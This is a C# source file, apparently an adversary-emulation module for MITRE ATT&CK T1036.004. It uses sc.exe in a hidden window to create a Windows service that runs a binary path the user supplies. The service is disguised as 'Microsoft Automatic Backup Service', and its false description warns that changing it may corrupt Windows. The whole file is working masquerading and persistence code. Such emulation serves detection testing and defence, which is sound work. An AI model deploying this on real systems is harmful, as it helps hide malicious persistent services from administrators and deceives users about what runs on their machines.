using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

class Technique
{
    /*
    * 
    * T1036-004 (Masquerading: Masquerade Task or Service).
    *
    * Possible Parameters:
    *   1 - binPath - Required
    *       Path to the desired service script/executable. i.e. \Users\Public\script.bat
    *       
    *   2 - displayName - Optional
    *       displayName of the service beign created. Defaults to Microsoft Automatic Backup Service.
    *       
    *   Requires Admin privileges
    *   
    *   todo:
    *   Service name
    *   Display name
    *   Description
    *   
*/

    public static Dictionary<string, string> EntryData { get; set; }
    public static Dictionary<string, string> ExitData { get; set; }

    public static bool execCommand(string executable, string parameters, string displayName, string description){
        try{
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();

            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = executable;
            startInfo.Arguments = "create AbsSv binPath='" + parameters + "' DisplayName=\"" + displayName + "\"";
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;

            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
            if (process.ExitCode == 0){
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = executable;
                startInfo.Arguments = "description AbsSv \"" + description + "\"";
                startInfo.RedirectStandardOutput = true;
                startInfo.UseShellExecute = false;

                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
                if (process.ExitCode == 0){
                    return true;
                }
            }
            Console.WriteLine(process.StandardOutput.ReadToEnd());
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error:" + ex.Message);
        }
        return false;
    }
    public static void Main(string[] args)
    {
        Console.WriteLine("[T1036.004] Starting Execution!");
        string execMethod = "sc.exe";
        string description = "Manages the execution and health check operations of the internal backup feature for Windows™ Operating System. Changes to this service may corrupt the Operating System.";
        string displayName;

        if (args.Length != 2){
            displayName = "Microsoft Automatic Backup Service";
        }
        else{
            displayName = args[1];
        }

        Console.WriteLine("[T1036.004] Using " + execMethod + " with: ServiceName '" + displayName + "' with binPath '" + args[0] + "'");
        if (execCommand(execMethod, args[0], displayName, description))
        {
            Console.WriteLine("[T1036.004] Successfully executed Technique (return 0)! ");
        }
        else
        {
            Console.WriteLine("[T1036.004] Oops, something went wrong! ");
        }
    }
}